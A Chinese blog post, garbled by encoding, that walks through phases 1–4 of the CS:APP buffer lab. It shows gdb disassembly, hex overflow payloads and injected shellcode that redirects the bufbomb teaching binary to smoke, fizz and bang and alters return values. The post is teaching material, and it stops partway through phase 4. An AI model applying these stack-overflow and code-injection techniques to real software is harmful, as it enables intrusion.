           href="/2020/07/04/%E6%9F%A5%E7%9C%8B%E4%B8%80%E4%B8%AAELF%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%A1%E6%81%AF/"
           data-tag="åŸºç¡€"
           data-author="" >
            <span class="post-title" title="æŸ¥çœ‹ä¸€ä¸ªELFæ–‡ä»¶çš„ä¿¡æ¯">æŸ¥çœ‹ä¸€ä¸ªELFæ–‡ä»¶çš„ä¿¡æ¯</span>
            <span class="post-date" title="2020-07-04 14:58:18">2020/07/04</span>
        </a>
        
        <a  class="All ç¬”è®° "
           href="/2020/07/04/ELF%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"
           data-tag="åŸºç¡€"
           data-author="" >
            <span class="post-title" title="ELFä¿æŠ¤æœºåˆ¶">ELFä¿æŠ¤æœºåˆ¶</span>
            <span class="post-date" title="2020-07-04 14:33:16">2020/07/04</span>
        </a>
        
        <a  class="All ç¬”è®° "
           href="/2020/07/03/PWN%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/"
           data-tag="å…¥é—¨"
           data-author="" >
            <span class="post-title" title="PWNå…¥é—¨åŸºç¡€">PWNå…¥é—¨åŸºç¡€</span>
            <span class="post-date" title="2020-07-03 13:05:08">2020/07/03</span>
        </a>
        
        <a  class="All PWNé¢˜ "
           href="/2020/07/03/bjdctf-2020-babyrop2/"
           data-tag="ROP,canary"
           data-author="" >
            <span class="post-title" title="bjdctf_2020_babyrop2">bjdctf_2020_babyrop2</span>
            <span class="post-date" title="2020-07-03 12:47:06">2020/07/03</span>
        </a>
        
        <a  class="All PWNé¢˜ "
           href="/2020/07/03/bjdctf-2020-babyrop/"
           data-tag="ROP"
           data-author="" >
            <span class="post-title" title="bjdctf_2020_babyrop">bjdctf_2020_babyrop</span>
            <span class="post-date" title="2020-07-03 12:40:13">2020/07/03</span>
        </a>
        
        <a  class="All PWNé¢˜ "
           href="/2020/07/03/BJDCTF-2nd-ydsneedgirlfriend2/"
           data-tag="UAF,tcache dup"
           data-author="" >
            <span class="post-title" title="[BJDCTF 2nd]ydsneedgirlfriend2">[BJDCTF 2nd]ydsneedgirlfriend2</span>
            <span class="post-date" title="2020-07-03 12:22:23">2020/07/03</span>
        </a>
        
        <a  class="All PWNé¢˜ "
           href="/2020/07/03/HITCON-training-hacknote-UAF/"
           data-tag="UAF,ctfwiki"
           data-author="" >
            <span class="post-title" title="HITCON-training-hacknote(UAF)">HITCON-training-hacknote(UAF)</span>
            <span class="post-date" title="2020-07-03 10:43:46">2020/07/03</span>
        </a>
        
        <a  class="All PWNé¢˜ "
           href="/2020/07/03/2018%E9%A6%96%E5%B1%8A%E7%BD%91%E5%AE%89%E7%9C%81%E8%B5%9B-cont/"
           data-tag="heap"
           data-author="" >
            <span class="post-title" title="2018é¦–å±Šç½‘å®‰çœèµ› -cont">2018é¦–å±Šç½‘å®‰çœèµ› -cont</span>
            <span class="post-date" title="2020-07-03 09:04:04">2020/07/03</span>
        </a>
        
        <a  class="All ç¬”è®° "
           href="/2020/07/03/gdb%E8%B0%83%E8%AF%95%E6%80%BB%E7%BB%93/"
           data-tag="gdb"
           data-author="" >
            <span class="post-title" title="gdbè°ƒè¯•æ€»ç»“">gdbè°ƒè¯•æ€»ç»“</span>
            <span class="post-date" title="2020-07-03 07:10:59">2020/07/03</span>
        </a>
        
        <a  class="All PWNé¢˜ "
           href="/2020/07/03/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B-uninit/"
           data-tag="ROP"
           data-author="" >
            <span class="post-title" title="ç¬¬äºŒå±Šæµ™æ±Ÿçœç½‘å®‰ç«èµ›åˆèµ›-uninit">ç¬¬äºŒå±Šæµ™æ±Ÿçœç½‘å®‰ç«èµ›åˆèµ›-uninit</span>
            <span class="post-date" title="2020-07-03 01:15:23">2020/07/03</span>
        </a>
        
        <a  class="All "
           href="/2020/07/02/hello-world/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Hello World">Hello World</span>
            <span class="post-date" title="2020-07-02 20:49:04">2020/07/02</span>
        </a>
        
        <div id="no-item-tips">

        </div>
    </nav>
    <div id="outline-list">
    </div>
</div>
    </div>
    <div class="hide-list">
        <div class="semicircle" data-title="åˆ‡æ¢å…¨å± å¿«æ·é”® s">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div id="post">
    <div class="pjax">
        <article id="post-å¤©é—®è®¡åˆ’week11-day2" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">å¤©é—®è®¡åˆ’week11-day2</h1>
    
    <div class="article-meta">
        
        
        
        <span class="book">
            <i class="iconfont icon-category"></i>
            
            
            <a  data-rel="ç³»åˆ—">ç³»åˆ—</a>
            
        </span>
        
        
        <span class="tag">
            <i class="iconfont icon-tag"></i>
            
            <a class="color5">å¤©é—®è®¡åˆ’</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
            Created At : <time class="date" title='Updated At: 2020-07-28 22:51:58'>2020-07-28 09:40</time>
        
    </div>
    <div class="article-meta">
        
        <span>Count:4.4k</span>
        
        
        <span id="busuanzi_container_page_pv">
            Views ğŸ‘€ :<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
        <span class="top-comment" title="è·³è½¬è‡³è¯„è®ºåŒº">
            <a href="#comments">
                Comment:<span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </a>
        </span>
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#buffer-labï¼š"><span class="toc-text">buffer labï¼š</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#å®éªŒæ–‡æ¡£æ‰‹å†Œï¼š"><span class="toc-text">å®éªŒæ–‡æ¡£æ‰‹å†Œï¼š</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-phase1ï¼š"><span class="toc-text">1.phase1ï¼š</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-phase2ï¼š"><span class="toc-text">2.phase2ï¼š</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-phase3ï¼š"><span class="toc-text">3.phase3ï¼š</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-phase4ï¼š"><span class="toc-text">4.phase4ï¼š</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-phase5ï¼š"><span class="toc-text">5.phase5ï¼š</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#å…³äºbuffer-labçš„æ€»ç»“ï¼š"><span class="toc-text">å…³äºbuffer labçš„æ€»ç»“ï¼š</span></a></li></ol></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="buffer-labï¼š"><a href="#buffer-labï¼š" class="headerlink" title="buffer labï¼š"></a>buffer labï¼š</h2><p>æ–‡ä»¶è¯´æ˜ï¼š</p>
<p>bufbombï¼šæ”»å‡»ç›®æ ‡æ–‡ä»¶ï¼Œä½¿ç”¨ä¸¾ä¾‹ï¼š./bufbomb -u sixpar</p>
<p>makecookieï¼šæ ¹æ®æ¯ä¸ªç”¨æˆ·è¾“å…¥çš„useridç”Ÿæˆæ¯ä¸ªç”¨æˆ·ä¸“å±çš„cookieï¼ˆ4å­—èŠ‚æ•°æ®ï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸åŒçš„useridå¯¹åº”ä¸åŒçš„ç»“æœã€‚ä½¿ç”¨ä¸¾ä¾‹ï¼š ./makecookie sixpar</p>
<p>hex2rawï¼šå°†åå…­è¿›åˆ¶çš„æ•°æ®è½¬ä¸ºæ™®é€šå­—ç¬¦ä»¥ä¾¿äºè¾“å…¥</p>
<h3 id="å®éªŒæ–‡æ¡£æ‰‹å†Œï¼š"><a href="#å®éªŒæ–‡æ¡£æ‰‹å†Œï¼š" class="headerlink" title="å®éªŒæ–‡æ¡£æ‰‹å†Œï¼š"></a>å®éªŒæ–‡æ¡£æ‰‹å†Œï¼š</h3><p>æ ¹æ®å®éªŒæ–‡æ¡£æ‰‹å†Œï¼Œå¦‚ä¸‹ï¼š</p>
<pre><code class="c">1 /* Buffer size for getbuf */
2 #define NORMAL_BUFFER_SIZE 32 
3
4 int getbuf()
5 {
6 char buf[NORMAL_BUFFER_SIZE];
7 Gets(buf);
8 return 1;
9 }
</code></pre>
<p>æˆ‘ä»¬çŸ¥é“äº†ç¨‹åºä¸­è°ƒç”¨äº†getbuf()å‡½æ•°ï¼Œè€Œgetbufå‡½æ•°å®é™…åˆè°ƒç”¨äº†getså‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä»¥â€™\nâ€™ä½œä¸ºæ•°æ®è¾“å…¥ç»“æŸæ ‡è®°ã€‚å› æ­¤å®ƒåªçŸ¥é“è¯»å–ï¼Œä¸çŸ¥é“bufèƒ½ä¸èƒ½æ‰¿å—é‚£ä¹ˆå¤šçš„æ•°æ®ï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“å­˜åœ¨æº¢å‡ºé—®é¢˜ã€‚</p>
<p>æ ¹æ®å®šä¹‰ï¼Œbufçš„sizeä¸º32å­—èŠ‚ã€‚å½“è¾“å…¥çš„æ•°æ®ä¸è¶…å‡ºbufçš„sizeæ—¶ï¼ŒGetså‡½æ•°è°ƒç”¨åä¼šreturn 0x1ï¼Œå¦åˆ™æº¢å‡ºåˆ™ä¼šé€ æˆé”™è¯¯ï¼šsegmentation faultï¼</p>
<h3 id="1-phase1ï¼š"><a href="#1-phase1ï¼š" class="headerlink" title="1.phase1ï¼š"></a>1.phase1ï¼š</h3><p>ç›®æ ‡æ˜¯æ‰§è¡Œsmokeï¼Œè€Œä¸æ˜¯è®©getbuf()è¿”å›1</p>
<p>æº¢å‡ºgetbuf()å‡½æ•°ï¼Œç„¶åæŠŠtest()çš„è¿”å›åœ°å€å¡«ä¸ºsmoke()å‡½æ•°èµ·å§‹åœ°å€ã€‚</p>
<pre><code class="c">gdb-peda$ disassemble getbuf
Dump of assembler code for function getbuf:
   0x080491f4 &lt;+0&gt;:        push   ebp
   0x080491f5 &lt;+1&gt;:        mov    ebp,esp
   0x080491f7 &lt;+3&gt;:        sub    esp,0x38
   0x080491fa &lt;+6&gt;:        lea    eax,[ebp-0x28]
   0x080491fd &lt;+9&gt;:        mov    DWORD PTR [esp],eax
   0x08049200 &lt;+12&gt;:    call   0x8048cfa &lt;Gets&gt;
   0x08049205 &lt;+17&gt;:    mov    eax,0x1
   0x0804920a &lt;+22&gt;:    leave  
   0x0804920b &lt;+23&gt;:    ret    
</code></pre>
<p>Getså‡½æ•°çš„è¿”å›å€¼å­˜å‚¨åœ¨ ebp-0x28 çš„ä½ç½®ï¼Œè¯¥åœ°å€å³å­˜å‚¨bufå­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€ã€‚</p>
<p>æ‰€ä»¥çŸ¥é“getbufçš„æ ˆå¤§å°ä¸º0x28ï¼ˆ40ï¼‰ä¸ªå­—èŠ‚ã€‚</p>
<p>è€Œsmokeçš„çš„èµ·å§‹åœ°å€ä¸º0x8048c18ï¼Œæ‰€ä»¥å°±è¿™æ ·å’¯ã€‚40å­—èŠ‚+ebpçš„aå­—èŠ‚éƒ½å¡«å……æ‰ã€‚ç„¶åæŠŠåŸæœ¬test()çš„è¿”å›åœ°å€è¦†ç›–ä¸ºsmoke()åœ°å€</p>
<p>ç»“æœï¼š</p>
<pre><code class="c">highk@highk:~/csapp lab/buffer lab$ cat phase1.txt | ./bufbomb -u sixpar
Userid: sixpar
Cookie: 0x171ae53c
Type string:Smoke!: You called smoke()
VALID
NICE JOB!</code></pre>
<h3 id="2-phase2ï¼š"><a href="#2-phase2ï¼š" class="headerlink" title="2.phase2ï¼š"></a>2.phase2ï¼š</h3><p>è¿™ä¸€å›ï¼Œå®éªŒè¦æ±‚è¿”å›åˆ° fizz()å‡½æ•°ã€‚</p>
<pre><code class="c">gdb-peda$ disassemble fizz
Dump of assembler code for function fizz:
   0x08048c42 &lt;+0&gt;:        push   ebp
   0x08048c43 &lt;+1&gt;:        mov    ebp,esp
   0x08048c45 &lt;+3&gt;:        sub    esp,0x18
   0x08048c48 &lt;+6&gt;:        mov    eax,DWORD PTR [ebp+0x8]
   0x08048c4b &lt;+9&gt;:        cmp    eax,DWORD PTR ds:0x804d108
   0x08048c51 &lt;+15&gt;:    jne    0x8048c79 &lt;fizz+55&gt;
   0x08048c53 &lt;+17&gt;:    mov    DWORD PTR [esp+0x8],eax
   0x08048c57 &lt;+21&gt;:    mov    DWORD PTR [esp+0x4],0x804a4ee
   0x08048c5f &lt;+29&gt;:    mov    DWORD PTR [esp],0x1
   0x08048c66 &lt;+36&gt;:    call   0x80489c0 &lt;__printf_chk@plt&gt;
   0x08048c6b &lt;+41&gt;:    mov    DWORD PTR [esp],0x1
   0x08048c72 &lt;+48&gt;:    call   0x804937b &lt;validate&gt;
   0x08048c77 &lt;+53&gt;:    jmp    0x8048c91 &lt;fizz+79&gt;
   0x08048c79 &lt;+55&gt;:    mov    DWORD PTR [esp+0x8],eax
   0x08048c7d &lt;+59&gt;:    mov    DWORD PTR [esp+0x4],0x804a340
   0x08048c85 &lt;+67&gt;:    mov    DWORD PTR [esp],0x1
   0x08048c8c &lt;+74&gt;:    call   0x80489c0 &lt;__printf_chk@plt&gt;
   0x08048c91 &lt;+79&gt;:    mov    DWORD PTR [esp],0x0
   0x08048c98 &lt;+86&gt;:    call   0x8048900 &lt;exit@plt&gt;</code></pre>
<p>å¯ä»¥çœ‹åˆ°0x08048c4bè¿™ä¸€è¡Œï¼Œç¨‹åºä¼šæŠŠeaxï¼ˆæˆ‘ä»¬ä¼ å…¥çš„å‚æ•°valï¼‰å’Œ ds:0x804d108 å¤„çš„å€¼è¿›è¡Œæ¯”å¯¹ã€‚</p>
<p>çŒœæµ‹0x804d108å¤„å­˜çš„å°±æ˜¯cookieçš„å€¼ã€‚</p>
<p>è°ƒè¯•ä¸€ä¸‹ï¼Œä½¿ç”¨ r -u sixpar è¿è¡Œç¨‹åºï¼Œç„¶åä»€ä¹ˆéƒ½ä¸ç”¨å¹²ï¼Œç›´æ¥æˆªæ–­ã€‚</p>
<p>ç„¶åæŸ¥çœ‹ï¼š</p>
<pre><code class="c">gdb-peda$ x/10xw 0x804d108
0x804d108 &lt;cookie&gt;:    0x171ae53c    0xf7fb15a0    0x00000000    0x00000000</code></pre>
<p>å‘ç°è¿™ä¸ªåœ°æ–¹æœç„¶å­˜å‚¨ç€å±äºæˆ‘sixparç”¨æˆ·çš„cookieï¼š 0x171ae53c</p>
<p>eaxåˆ™å– [ebp+0x8] çš„å€¼ã€‚æ‰€ä»¥æˆ‘ä»¬æº¢å‡ºï¼ŒæŠŠebp+0x8çš„ä½ç½®è¦†ç›–ä¸ºæ­£ç¡®çš„cookieå€¼å°±è¡Œäº†å•Šã€‚</p>
<p>è¿™é‡Œæ³¨æ„çš„æ˜¯å“ªä¸ªebpã€‚</p>
<p>ç”±äºè¿”å›åœ°å€å¡«ä¸ºäº†fizz()ï¼Œæ‰€ä»¥æœ€åpop fizzçš„èµ·å§‹åœ°å€åˆ°eipç„¶åè·³è½¬æ‰§è¡Œã€‚</p>
<p>fizzå‡½æ•°çš„å¼€å¤´ä¼š push ebpï¼Œç„¶åmov esp,ebpï¼Œä½¿å¾—åœ¨<code>åŸå…ˆè¿”å›åœ°å€çš„ä½ç½®</code>ä¸Šåˆå¼€å¯äº†ä¸€ä¸ªæ–°çš„æ ˆå¸§ï¼ˆè™½ç„¶æ ˆå¸§è¿˜æ˜¯ç©ºçš„ï¼Œespå’Œebpè¿˜æ˜¯æŒ‡å‘åŒä¸€åœ°æ–¹çš„ï¼‰ï¼Œæ‰€ä»¥å½“æ‰§è¡Œåˆ°å–ebp+0x8çš„ä½ç½®çš„å€¼çš„è¯­å¥çš„æ—¶å€™ï¼Œè¿™é‡Œçš„ebpæŒ‡çš„æ˜¯æ–°çš„ebpã€‚æ–°çš„ebp+0x8</p>
<p>æ‰€ä»¥ç…§æ­¤æ€è·¯ï¼Œæˆ‘ä»¬æ„é€ payloadæ—¶ï¼Œä¹Ÿè¦åœ¨åŸå…ˆ<code>è¿”å›çš„åœ°å€çš„åé¢çš„0x8çš„ä½ç½®</code>ä¸Šæ”¾cookieçš„å€¼æ‰è¡Œã€‚</p>
<p>è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè¿”å›åœ°å€å’Œcookieå€¼ä¹‹é—´è¿˜å¤šå‡ºæ¥4å­—èŠ‚æ•°æ®çš„åŸå› ã€‚ï¼ˆæˆ‘ä¸€å¼€å§‹è¿˜æ²¡ææ‡‚hhhï¼‰</p>
<p>æ‰€ä»¥æœ€ç»ˆæ„é€ å¦‚ä¸‹ï¼š</p>
<pre><code class="c">0000000000000000
0000000000000000
0000000000000000    
0000000000000000    
00000000428C0408
000000003Ce51a17    </code></pre>
<p>ç»“æœï¼š</p>
<pre><code class="c">highk@highk:~/csapp lab/buffer lab$ cat phase2.txt | ./bufbomb -u sixpar
Userid: sixpar
Cookie: 0x171ae53c
Type string:Fizz!: You called fizz(0x171ae53c)
VALID
NICE JOB!</code></pre>
<h3 id="3-phase3ï¼š"><a href="#3-phase3ï¼š" class="headerlink" title="3.phase3ï¼š"></a>3.phase3ï¼š</h3><p>è¿”å›åˆ°bang()å‡½æ•°ã€‚æœ¬é¢˜éœ€è¦æ¤å…¥æœºå™¨ç ï¼Œä¿®æ”¹ global_value ä¸º cookies çš„å€¼ã€‚</p>
<p>bangå‡½æ•°å¦‚ä¸‹ï¼š</p>
<pre><code class="c">gdb-peda$ disassemble bang
Dump of assembler code for function bang:
   0x08048c9d &lt;+0&gt;:        push   ebp
   0x08048c9e &lt;+1&gt;:        mov    ebp,esp
   0x08048ca0 &lt;+3&gt;:        sub    esp,0x18
   0x08048ca3 &lt;+6&gt;:        mov    eax,ds:0x804d100
   0x08048ca8 &lt;+11&gt;:    cmp    eax,DWORD PTR ds:0x804d108
   0x08048cae &lt;+17&gt;:    jne    0x8048cd6 &lt;bang+57&gt;
   0x08048cb0 &lt;+19&gt;:    mov    DWORD PTR [esp+0x8],eax
   0x08048cb4 &lt;+23&gt;:    mov    DWORD PTR [esp+0x4],0x804a360
   0x08048cbc &lt;+31&gt;:    mov    DWORD PTR [esp],0x1
   0x08048cc3 &lt;+38&gt;:    call   0x80489c0 &lt;__printf_chk@plt&gt;
   0x08048cc8 &lt;+43&gt;:    mov    DWORD PTR [esp],0x2
   0x08048ccf &lt;+50&gt;:    call   0x804937b &lt;validate&gt;
   0x08048cd4 &lt;+55&gt;:    jmp    0x8048cee &lt;bang+81&gt;
   0x08048cd6 &lt;+57&gt;:    mov    DWORD PTR [esp+0x8],eax
   0x08048cda &lt;+61&gt;:    mov    DWORD PTR [esp+0x4],0x804a50c
   0x08048ce2 &lt;+69&gt;:    mov    DWORD PTR [esp],0x1
   0x08048ce9 &lt;+76&gt;:    call   0x80489c0 &lt;__printf_chk@plt&gt;
   0x08048cee &lt;+81&gt;:    mov    DWORD PTR [esp],0x0
   0x08048cf5 &lt;+88&gt;:    call   0x8048900 &lt;exit@plt&gt;</code></pre>
<p>å¯è§å®ƒä¼šæŠŠ0x804d108å¤„çš„å€¼ç»™eaxï¼Œç„¶åæ¯”è¾ƒeaxå’Œcookieå€¼æ˜¯å¦ç›¸ç­‰ã€‚</p>
<p>æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹0x804d108ï¼š</p>
<pre><code class="c">gdb-peda$ x/10xw 0x804d100
0x804d100 &lt;global_value&gt;:    0x00000000    0x00000000    0x171ae53c    0xf7fb15a0</code></pre>
<p>å‘ç°å­˜å‚¨çš„æ˜¯ global_valueå˜é‡çš„åœ°å€ã€‚è€Œä¸è¿œå¤„çš„0x171ae53cåˆšå¥½å­˜å‚¨ç€æ­£ç¡®çš„cookieçš„å€¼ã€‚</p>
<p>æˆ‘ä»¬çš„æƒ³æ³•å°±æ˜¯æ³¨å…¥ä»£ç ï¼Œç„¶åä¿®æ”¹global_valueå˜é‡çš„å€¼ã€‚å¹¶ä¸”æŠŠbangå‡½æ•°çš„èµ·å§‹åœ°å€å‹å…¥æ ˆï¼Œéšåretã€‚</p>
<p>æ‰€ä»¥å¾—åˆ°çš„æ³¨å…¥ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="c">movl $0x171ae53c,%eax
movl %eax,0x804d100
pushl $0x08048c9d
ret</code></pre>
<p>ç„¶åå°†æ±‡ç¼–æ–‡ä»¶è½¬ä¸ºæœºå™¨ç ã€‚</p>
<p>gcc -m32 -c phase3.s   ï¼Œæ³¨æ„åŠ  -m 32 ï¼Œå› ä¸ºè¿™æ˜¯32ä½çš„ç¨‹åºã€‚</p>
<p>å¾—åˆ°ï¼š</p>
<pre><code class="c">highk@highk:~/csapp lab/buffer lab$ objdump -d phase3.o

phase3.oï¼š     æ–‡ä»¶æ ¼å¼ elf32-i386

Disassembly of section .text:

00000000 &lt;.text&gt;:
   0:    b8 3c e5 1a 17           mov    $0x171ae53c,%eax
   5:    a3 00 d1 04 08           mov    %eax,0x804d100
   a:    68 9d 8c 04 08           push   $0x8048c9d
   f:    c3                       ret   </code></pre>
<p>æ‰€ä»¥æœºå™¨ç å°±æ˜¯ï¼š</p>
<pre><code class="c">b8 3c e5 1a 17 a3 00 d1 04 08 68 9d 8c 04 08 c3</code></pre>
<p>æŠŠè¿™ä¸²shellcodeå†™åœ¨æ ˆé¦–åœ°å€ï¼Œç„¶åè¿”å›åœ°å€å¡«æ ˆçš„é¦–åœ°å€å°±å¯å•¦ã€‚</p>
<p>å¯¹äº†ï¼Œè¯´åˆ°æ ˆçš„é¦–åœ°å€ï¼Œè¿™é‡Œè¿˜æ˜¯é‡å¤ä¸€éå§ã€‚</p>
<p>gdbè°ƒè¯•ï¼Œç„¶ååœ¨getbufå‡½æ•°ä¸­çš„call Getså¤„ä¸‹æ–­ç‚¹ï¼Œb *0x8049200</p>
<p>ç„¶årè¿è¡Œèµ·æ¥ï¼Œè‡ªåŠ¨æ–­åœ¨Getså¤„ï¼Œç„¶åniä¸‹ä¸€æ­¥ï¼Œéšä¾¿è¾“å…¥aaaaaaï¼Œç„¶åå°±å¯ä»¥çœ‹åˆ°æ ˆä¸­ï¼š</p>
<p>0x55683e18 (â€œaaaaaaaaâ€)</p>
<p>è¯´æ˜0x55683e18 å°±æ˜¯æ ˆçš„é¦–åœ°å€ï¼Œå®ƒåŒæ—¶ä¹Ÿæ˜¯å­—ç¬¦ä¸²æŒ‡é’ˆæŒ‡å‘å­—ç¬¦ä¸²ã€‚</p>
<p>æœ€ç»ˆpayloadæ•°æ®ä¸ºï¼š</p>
<pre><code class="c">B83CE51A17A300D1
0408689D8C0408C3
0000000000000000
0000000000000000
0000000000000000
00000000183E6855</code></pre>
<p>ç»“æœï¼š</p>
<pre><code class="c">highk@highk:~/csapp lab/buffer lab$ cat phase3.txt | ./bufbomb -u sixpar
Userid: sixpar
Cookie: 0x171ae53c
Type string:Bang!: You set global_value to 0x171ae53c
VALID
NICE JOB!</code></pre>
<h3 id="4-phase4ï¼š"><a href="#4-phase4ï¼š" class="headerlink" title="4.phase4ï¼š"></a>4.phase4ï¼š</h3><p>æœ¬é¢˜è¦æ±‚æˆ‘ä»¬æ³¨å…¥ä¸€æ®µèƒ½å¤Ÿä¿®æ”¹ getbuf è¿”å›å€¼çš„ä»£ç ï¼ŒæŠŠè¿”å›å€¼ä» 1 æ”¹æˆ cookie å€¼ï¼Œæ­¤å¤–è¿˜éœ€è¦è¿˜åŸæ‰€æœ‰ç ´åï¼Œç»§ç»­è¿è¡Œ test ç¨‹åºçš„å‰©ä¸‹éƒ¨åˆ†ã€‚</p>
<p>ç»§ç»­ä¸Šæ±‡ç¼–ï¼š</p>
<p>getbuf():</p>
<pre><code class="c">gdb-peda$ disassemble getbuf
Dump of assembler code for function getbuf:
   0x080491f4 &lt;+0&gt;:        push   ebp
   0x080491f5 &lt;+1&gt;:        mov    ebp,esp
   0x080491f7 &lt;+3&gt;:        sub    esp,0x38
   0x080491fa &lt;+6&gt;:        lea    eax,[ebp-0x28]
   0x080491fd &lt;+9&gt;:        mov    DWORD PTR [esp],eax
   0x08049200 &lt;+12&gt;:    call   0x8048cfa &lt;Gets&gt;
   0x08049205 &lt;+17&gt;:    mov    eax,0x1
   0x0804920a &lt;+22&gt;:    leave  
   0x0804920b &lt;+23&gt;:    ret    </code></pre>
<p>æ³¨æ„åˆ°åœ¨ Gets ä¹‹åï¼Œeax ä¼šè¢«ä¿®æ”¹ä¸º 1ï¼Œæ‰€ä»¥åœ¨æ­£å¸¸æƒ…å†µä¸‹å‡½æ•°æ€»ä¼šè¿”å› 1ã€‚è€Œä¸ºäº†æ”¹å˜è¿™ä¸€è¡Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨ä¿®æ”¹ eax ä¸º coockieï¼Œæ‰€ä»¥éœ€è¦æ³¨å…¥ä¸€æ®µä»£ç ï¼Œé¦–å…ˆæ‰‹åŠ¨è®¾ç½® eax ä¸º cookieï¼Œç„¶åå°†è¿”å›åœ°å€è®¾ç½®ä¸º test åœ¨è°ƒç”¨äº† getbuf ä¹‹åçš„ä¸‹ä¸€è¡Œ 0x08048dbe</p>
<p>test():</p>
<pre><code class="c">gdb-peda$ disassemble test
Dump of assembler code for function test:
   0x08048daa &lt;+0&gt;:        push   ebp
   0x08048dab &lt;+1&gt;:        mov    ebp,esp
   0x08048dad &lt;+3&gt;:        push   ebx
   0x08048dae &lt;+4&gt;:        sub    esp,0x24
   0x08048db1 &lt;+7&gt;:        call   0x8048d90 &lt;uniqueval&gt;
   0x08048db6 &lt;+12&gt;:    mov    DWORD PTR [ebp-0xc],eax
   0x08048db9 &lt;+15&gt;:    call   0x80491f4 &lt;getbuf&gt;  //è°ƒç”¨ getbuf 
   0x08048dbe &lt;+20&gt;:    mov    ebx,eax   //åŠ«æŒgetbufä¿®æ”¹eaxçš„å€¼ï¼Œæ‰‹åŠ¨ä»¤getbufç»“æŸæ—¶è·³è½¬åˆ°è¿™é‡Œ
   0x08048dc0 &lt;+22&gt;:    call   0x8048d90 &lt;uniqueval&gt;
   0x08048dc5 &lt;+27&gt;:    mov    edx,DWORD PTR [ebp-0xc]
   0x08048dc8 &lt;+30&gt;:    cmp    eax,edx
   0x08048dca &lt;+32&gt;:    je     0x8048dda &lt;test+48&gt;
   0x08048dcc &lt;+34&gt;:    mov    DWORD PTR [esp],0x804a388
   0x08048dd3 &lt;+41&gt;:    call   0x80488c0 &lt;puts@plt&gt;
   0x08048dd8 &lt;+46&gt;:    jmp    0x8048e20 &lt;test+118&gt;
   0x08048dda &lt;+48&gt;:    cmp    ebx,DWORD PTR ds:0x804d108
   0x08048de0 &lt;+54&gt;:    jne    0x8048e08 &lt;test+94&gt;
   0x08048de2 &lt;+56&gt;:    mov    DWORD PTR [esp+0x8],ebx
   0x08048de6 &lt;+60&gt;:    mov    DWORD PTR [esp+0x4],0x804a52a
   0x08048dee &lt;+68&gt;:    mov    DWORD PTR [esp],0x1
   0x08048df5 &lt;+75&gt;:    call   0x80489c0 &lt;__printf_chk@plt&gt;
   0x08048dfa &lt;+80&gt;:    mov    DWORD PTR [esp],0x3
   0x08048e01 &lt;+87&gt;:    call   0x804937b &lt;validate&gt;
   0x08048e06 &lt;+92&gt;:    jmp    0x8048e20 &lt;test+118&gt;
   0x08048e08 &lt;+94&gt;:    mov    DWORD PTR [esp+0x8],ebx
   0x08048e0c &lt;+98&gt;:    mov    DWORD PTR [esp+0x4],0x804a547
   0x08048e14 &lt;+106&gt;:    mov    DWORD PTR [esp],0x1
   0x08048e1b &lt;+113&gt;:    call   0x80489c0 &lt;__printf_chk@plt&gt;
   0x08048e20 &lt;+118&gt;:    add    esp,0x24
   0x08048e23 &lt;+121&gt;:    pop    ebx
   0x08048e24 &lt;+122&gt;:    pop    ebp
   0x08048e25 &lt;+123&gt;:    ret </code></pre>
<p>æ³¨å…¥ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="c">movl $0x171ae53c,%eax
pushl $0x08048dbe
ret</code></pre>
<p>æœºå™¨ç ä¸ºï¼š</p>
<pre><code class="c">highk@highk:~/csapp lab/buffer lab$ objdump -d phase4.o

phase4.oï¼š     æ–‡ä»¶æ ¼å¼ elf32-i386

Disassembly of section .text:

00000000 &lt;.text&gt;:
   0:    b8 3c e5 1a 17           mov    $0x171ae53c,%eax
   5:    68 be 8d 04 08           push   $0x8048dbe
   a:    c3                       ret </code></pre>
<p>å³æœºå™¨ç ä¸ºï¼š</p>
<pre><code class="c">b8 3c e5 1a 17 68 be 8d 04 08 c3</code></pre>
<p>è€Œæœ¬é¢˜å€¼å¾—æ³¨æ„çš„æ˜¯ï¼š</p>
<p>ä¸ºäº†ä½¿å¾—test()èƒ½å¤Ÿç»§ç»­æ‰§è¡Œä¸‹å»ï¼Œæ‰€ä»¥æ—§çš„ebpçš„å€¼å¿…é¡»ä¿ç•™ã€‚ï¼ˆtestæ˜¯çˆ¶å‡½æ•°ï¼Œæ‰€ä»¥test()çš„ebpç›¸æ¯”è¾ƒäºgetbufçš„ebpæ˜¯æ—§çš„ebpäº†ï¼‰ã€‚</p>
